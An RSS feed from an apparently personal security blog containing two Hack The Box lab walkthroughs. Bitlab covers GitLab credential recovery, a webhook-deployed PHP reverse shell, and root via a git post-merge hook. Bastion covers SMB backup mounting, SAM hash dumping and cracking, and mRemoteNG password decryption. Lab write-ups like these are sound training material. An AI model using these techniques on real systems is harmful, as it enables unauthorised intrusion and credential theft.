<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>HTB on</title><link>https://blog.ikuamike.io/tags/htb/</link><description>Recent content in HTB on</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>Â© Michael Ikua</copyright><lastBuildDate>Sat, 11 Jan 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/htb/index.xml" rel="self" type="application/rss+xml"/><item><title>Hack The Box: Bitlab</title><link>https://blog.ikuamike.io/posts/2020/bitlab-htb/</link><pubDate>Sat, 11 Jan 2020 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2020/bitlab-htb/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/bitlab/info_card.png" alt="Bastion Info Card" class="center" style="border-radius: 8px;" />
&lt;h1 id="summary">Summary&lt;/h1>
&lt;p>As the name suggests this box had a instance of gitlab where the initial foothold involves getting credentials from obfuscated javascript and once logged into the gitlab instance we abuse webhooks to add our own code and execute it to get a reverse shell. Read on to see how I able to root the box.&lt;/p>
&lt;h1 id="enumeration">Enumeration&lt;/h1>
&lt;p>As usual I start with a quick nmap scan to find open ports and then run a second scan for service and version detection.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">nmap -sS -p- --min-rate&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span> 10.10.10.114
Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.114
Host is up &lt;span style="color:#f92672">(&lt;/span>0.21s latency&lt;span style="color:#f92672">)&lt;/span>.
Not shown: &lt;span style="color:#ae81ff">65533&lt;/span> filtered ports
PORT STATE SERVICE
22/tcp open ssh
80/tcp open http
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Thorough scan:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">nmap -Pn -sC -sV -p 22,80 -oA nmap/bitlab 10.10.10.114
Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.114
Host is up &lt;span style="color:#f92672">(&lt;/span>0.47s latency&lt;span style="color:#f92672">)&lt;/span>.
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span style="color:#f92672">(&lt;/span>Ubuntu Linux; protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
| ssh-hostkey:
| &lt;span style="color:#ae81ff">2048&lt;/span> a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
| &lt;span style="color:#ae81ff">256&lt;/span> e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
|_ &lt;span style="color:#ae81ff">256&lt;/span> c9:54:3d:91:01:78:03ðŸ†Ž16:14:6b:cc:f0:b7:3a:55 &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
80/tcp open http nginx
| http-robots.txt: &lt;span style="color:#ae81ff">55&lt;/span> disallowed entries &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">15&lt;/span> shown&lt;span style="color:#f92672">)&lt;/span>
| / /autocomplete/users /search /api /admin /profile
| /dashboard /projects/new /groups/new /groups/*/edit /users /help
|_/s/ /snippets/new /snippets/*/edit
|_http-server-header: nginx
| http-title: Sign in &lt;span style="color:#ae81ff">\x&lt;/span>C2&lt;span style="color:#ae81ff">\x&lt;/span>B7 GitLab
|_Requested resource was http://10.10.10.114/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="gitlab">Gitlab&lt;/h2>
&lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-01.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
&lt;p>After trying out some simple combinations of username and password that didn&amp;rsquo;t work I decided to click on links on the home page and see if I&amp;rsquo;ll get a version number. When I opened the help link I got this.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-02.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
&lt;p>In bookmarks.html the links were normal apart from the last one which was javascript.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-03.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
&lt;!-- raw HTML omitted -->
&lt;p>The deobfuscated javascript shows a username and password.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#a6e22e">javascript&lt;/span>&lt;span style="color:#f92672">:&lt;/span> (&lt;span style="color:#66d9ef">function&lt;/span> ()
{
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">_0x4b18&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#34;value&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;user_login&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;getElementById&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;clave&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;user_password&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;11des0081x&amp;#34;&lt;/span>];
document[&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">2&lt;/span>]](&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">1&lt;/span>])[&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">3&lt;/span>];
document[&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">2&lt;/span>]](&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">4&lt;/span>])[&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">5&lt;/span>];
})()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>After logging in there are two projects.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-04.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
&lt;p>My user has Developer role on the Profile repo and Reporter role on the Deployer repo. I can&amp;rsquo;t edit the deployer but looking at the files the readme has a link about gitlab webhooks.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-05.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
&lt;p>In the index.php the part that caught my eye is the if statement. If that condition is true, a command to change directory is run and then a git pull.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-06.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
&lt;p>Based on the name of the script we can guess it deploys changes made to the profile repo after a merge request is made. Since it pulls to /profile this is probably the directory where it&amp;rsquo;s hosted. We can verify this by going to /profile.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-07.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
&lt;h3 id="getting-shell">Getting Shell&lt;/h3>
&lt;p>I&amp;rsquo;ll add a php file to the profile repo that will give me a reverse shell on the server. I will need to also create a pull request with my new file and merge it, this will create a webhook to the deployer script and it will download it on the web server, allowing me to execute it.&lt;/p>
&lt;p>Adding reverse shell php file:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-08.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
&lt;p>Merging the request:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-09.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
&lt;p>The file is successfully added to master branch:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-10.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
&lt;p>Finally got my shell by visiting 10.10.10.114/profile/shell.php on my browser:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-11.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
&lt;h2 id="getting-user">Getting User&lt;/h2>
&lt;p>The user.txt is only readable the clave user. After a bit of local enumeration and getting stuck I decided to go back to the gitlab instance to see if I may have missed anything. I found a snippet mentioning postgresql and a db connection script.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-12.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
&lt;p>Checking on the server we indeed have a postgresql instance running locally on port 5432.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-13.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
&lt;p>After some tweaking I was able to get a script working that would read the db.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
$host &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;host = 127.0.0.1&amp;#34;&lt;/span>;
$port &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;port = 5432&amp;#34;&lt;/span>;
$dbname &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;dbname = profiles&amp;#34;&lt;/span>;
$credentials &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;user = profiles password=profiles&amp;#34;&lt;/span>;
$db &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">pg_connect&lt;/span>( &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">$host&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">$port&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">$dbname&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">$credentials&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> );
&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>$db) {
&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Error : Unable to open database&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
} &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Opened database successfully&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
}
$sql &lt;span style="color:#f92672">=&amp;lt;&amp;lt;&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">EOF&lt;/span>
&lt;span style="color:#a6e22e">SELECT&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#a6e22e">from&lt;/span> &lt;span style="color:#a6e22e">profiles&lt;/span>;
&lt;span style="color:#a6e22e">EOF&lt;/span>;
$ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">pg_query&lt;/span>($db, $sql);
&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>$ret) {
&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#a6e22e">pg_last_error&lt;/span>($db);
&lt;span style="color:#66d9ef">exit&lt;/span>;
}
&lt;span style="color:#66d9ef">while&lt;/span>($row &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">pg_fetch_row&lt;/span>($ret)) {
&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span> $row[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span> $row[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span> $row[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
}
&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Operation done successfully&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
&lt;span style="color:#a6e22e">pg_close&lt;/span>($db);
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In the db I found a password which appears to be base64 encoded but the trick was to use it as it is and not decode it for it to work.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-15.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
&lt;h2 id="getting-root">Getting Root&lt;/h2>
&lt;p>This part was interesting as I had never heard of this technique before. The user www-data had sudo rights to run git pull.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-16.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
&lt;p>In git there are scripts called git hooks which can run automatically before or after git actions like commits. You can configure them in .git/hooks. For this case I&amp;rsquo;ll use &lt;strong>post-merge&lt;/strong> since when git pull is run a merge action is done.&lt;/p>
&lt;p>Since we can&amp;rsquo;t edit the current folder copy the profile repo to a world writeable directory like /tmp and create the post-merge script in hooks, the script will give a reverse shell.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">cp -r /var/www/html/profile /tmp
&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-17.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
&lt;p>After making this file executable, we just have to make any change to the repo on the gitlab instance like creating a txt file and make sure we merge it to master. Once that is done, we can run sudo git pull and get a root reverse shell.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-18.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
&lt;p>As you may have noticed since we used the www-data user to get root, we would have skipped the getting user path using the postgresql db and read user.txt from the root user.&lt;/p></content></item><item><title>Hack The Box: Bastion</title><link>https://blog.ikuamike.io/posts/2019/bastion-htb/</link><pubDate>Fri, 06 Sep 2019 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2019/bastion-htb/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/bastion/info_card.png" alt="Bastion Info Card" class="center" style="border-radius: 8px;" />
&lt;h1 id="summary">Summary&lt;/h1>
&lt;p>Bastion was a relatively easy box. There is an smb share is accessible without credentials and inside there is a backup drive that we can mount and access. From the drive we can dump the SAM file and crack it to get login credentials. Once logged in we find mRemoteNG installed and extract its saved passwords to get admin access.&lt;/p>
&lt;h1 id="enumeration">Enumeration&lt;/h1>
&lt;p>I start with this nmap command to quickly find open ports.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">nmap -sS -p- --min-rate&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span> 10.10.10.134
Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.134
Host is up &lt;span style="color:#f92672">(&lt;/span>0.23s latency&lt;span style="color:#f92672">)&lt;/span>.
Not shown: &lt;span style="color:#ae81ff">65522&lt;/span> closed ports
PORT STATE SERVICE
22/tcp open ssh
135/tcp open msrpc
139/tcp open netbios-ssn
445/tcp open microsoft-ds
5985/tcp open wsman
47001/tcp open winrm
49664/tcp open unknown
49665/tcp open unknown
49666/tcp open unknown
49667/tcp open unknown
49668/tcp open unknown
49669/tcp open unknown
49670/tcp open unknown
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then run a thorough service scan on the discovered ports.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">nmap -sC -sV -p 22,135,139,445,5985,47001 -oA nmap/bastion 10.10.10.134
Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.134
Host is up &lt;span style="color:#f92672">(&lt;/span>0.22s latency&lt;span style="color:#f92672">)&lt;/span>.
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH for_Windows_7.9 &lt;span style="color:#f92672">(&lt;/span>protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
| ssh-hostkey:
| &lt;span style="color:#ae81ff">2048&lt;/span> 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
| &lt;span style="color:#ae81ff">256&lt;/span> cc:2e:56ðŸ†Ž19:97:d5:bb:03:fb:82ðŸ’¿63:da:68:01 &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
|_ &lt;span style="color:#ae81ff">256&lt;/span> 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open microsoft-ds Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard &lt;span style="color:#ae81ff">14393&lt;/span> microsoft-ds
5985/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span style="color:#f92672">(&lt;/span>SSDP/UPnP&lt;span style="color:#f92672">)&lt;/span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span style="color:#f92672">(&lt;/span>SSDP/UPnP&lt;span style="color:#f92672">)&lt;/span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server &lt;span style="color:#ae81ff">2008&lt;/span> R2 - 2012; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: -42m39s, deviation: 1h09m15s, median: -2m40s
| smb-os-discovery:
| OS: Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard &lt;span style="color:#ae81ff">14393&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard 6.3&lt;span style="color:#f92672">)&lt;/span>
| Computer name: Bastion
| NetBIOS computer name: BASTION&lt;span style="color:#ae81ff">\x&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>
| Workgroup: WORKGROUP&lt;span style="color:#ae81ff">\x&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>
|_ System time: 2019-09-06T13:28:45+02:00
| smb-security-mode:
| account_used: guest
| authentication_level: user
| challenge_response: supported
|_ message_signing: disabled &lt;span style="color:#f92672">(&lt;/span>dangerous, but default&lt;span style="color:#f92672">)&lt;/span>
| smb2-security-mode:
| 2.02:
|_ Message signing enabled but not required
| smb2-time:
| date: 2019-09-06 12:28:49
|_ start_date: 2019-09-06 11:58:13
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="smb">SMB&lt;/h2>
&lt;p>Based on the open ports the best service to check out first is smb.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">smbmap -H 10.10.10.134 -u &lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Finding open SMB ports....
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Guest SMB session established on 10.10.10.134...
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> IP: 10.10.10.134:445 Name: 10.10.10.134
Disk Permissions
---- -----------
ADMIN$ NO ACCESS
Backups READ, WRITE
C$ NO ACCESS
IPC$ READ ONLY
&lt;/code>&lt;/pre>&lt;/div>&lt;p>After running smbmap, I discover a share called Backups that I have read and write permissions as a guest user.&lt;/p>
&lt;p>Since this is a windows machine I will switch to my windows vm to make my work easier.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bastion/backup_share.png" alt="backup share" class="center" style="border-radius: 8px;" />
&lt;!-- raw HTML omitted -->
&lt;p>Contents of note.txt&lt;/p>
&lt;p>&lt;em>Sysadmins: please don&amp;rsquo;t transfer the entire backup file locally, the VPN to the subsidiary office is too slow.&lt;/em>&lt;/p>
&lt;p>Going deeper into the WindowsImageBackup folder I found a backup image which is quite big. Downloading the whole file would not be an option as the note.txt suggested. Fortunately I can mount it through the share remotely, this is the reason why I wanted to use a windows vm.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bastion/backup_share_2.png" alt="backup share" class="center" style="border-radius: 8px;" />
&lt;!-- raw HTML omitted -->
&lt;p>On mounting it, it appears as Local Disk (D:). After accessing the home directory of user L4mpje and looking through the folders there was no user.txt, it must have been excluded from the backup.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bastion/backup_share_3.png" alt="backup share" class="center" style="border-radius: 8px;" />
&lt;p>At this stage I was stuck for a while (I still suck at owning windows) and after some hints in the forum I figured I should look at where credentials are stored locally on windows and how to get them. Simply the equivalent of /etc/shadow or /etc/passwd on linux.&lt;/p>
&lt;p>I learnt that I should be looking in C:\windows\system32\config for the SAM and SYSTEM files which I found.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bastion/backup_share_4.png" alt="backup share" class="center" style="border-radius: 8px;" />
&lt;h5 id="now-to-get-the-credentials">Now to get the credentials!&lt;/h5>
&lt;p>I pulled the 2 files back to my kali box and using samdump2 I got the user hash.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">samdump2 SYSTEM SAM
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
&lt;/code>&lt;/pre>&lt;/div>&lt;p>I then cracked the NTLM hash for L4mpje using hashcat and got the password.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">hashcat -m &lt;span style="color:#ae81ff">1000&lt;/span> -a &lt;span style="color:#ae81ff">0&lt;/span> 26112010952d963c8dc4217daec986d9 /usr/share/wordlists/rockyou.txt --force
26112010952d963c8dc4217daec986d9:bureaulampje
&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="exploitation">Exploitation&lt;/h1>
&lt;p>Now that I have a username and password I can login through ssh.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bastion/bastion_5.png" alt="backup share" class="center" style="border-radius: 8px;" />
&lt;p>Now that user is owned, let&amp;rsquo;s try to escalate privileges to admin.&lt;/p>
&lt;p>I switched to powershell and started looking at installed programs. mRemoteNG isn&amp;rsquo;t a default windows application so let me look into it and if it can help in privesc.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bastion/bastion_6.png" alt="backup share" class="center" style="border-radius: 8px;" />
&lt;!-- raw HTML omitted -->
&lt;p>According to their website:&lt;/p>
&lt;p>&lt;em>mRemoteNG is a fork of mRemote: an open source, tabbed, multi-protocol, remote connections manager.&lt;/em>&lt;/p>
&lt;p>I found a metasploit module that claims to extract saved passwords from mRemoteNG. Since I am logged in I don&amp;rsquo;t need metasploit so I looked at the source to see how it extracts the passwords and decrypts them.&lt;/p>
&lt;p>The saved passwords are located in AppData in mRemoteNG\confCons.xml. Once I found the file the admin password was there but encrypted.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bastion/bastion_7.png" alt="backup share" class="center" style="border-radius: 8px;" />
&lt;p>I was able to find a script on github to decrypt the password.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">./mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw&lt;span style="color:#f92672">==&lt;/span>
Password: thXLHM96BeKL0ER2
&lt;/code>&lt;/pre>&lt;/div>&lt;p>I can finally login as administrator and own system!&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bastion/bastion_8.png" alt="backup share" class="center" style="border-radius: 8px;" />
&lt;h1 id="references">References&lt;/h1>
&lt;ul>
&lt;li>&lt;a href="https://github.com/haseebT/mRemoteNG-Decrypt/blob/master/mremoteng_decrypt.py" target="_blank" rel="noopener">mremoteng_decrypt.py&lt;/a>
&lt;/li>
&lt;li>&lt;a href="https://vulners.com/metasploit/MSF:POST/WINDOWS/GATHER/CREDENTIALS/MREMOTE/" target="_blank" rel="noopener">mremote metasploit module&lt;/a>
&lt;/li>
&lt;/ul></content></item></channel></rss>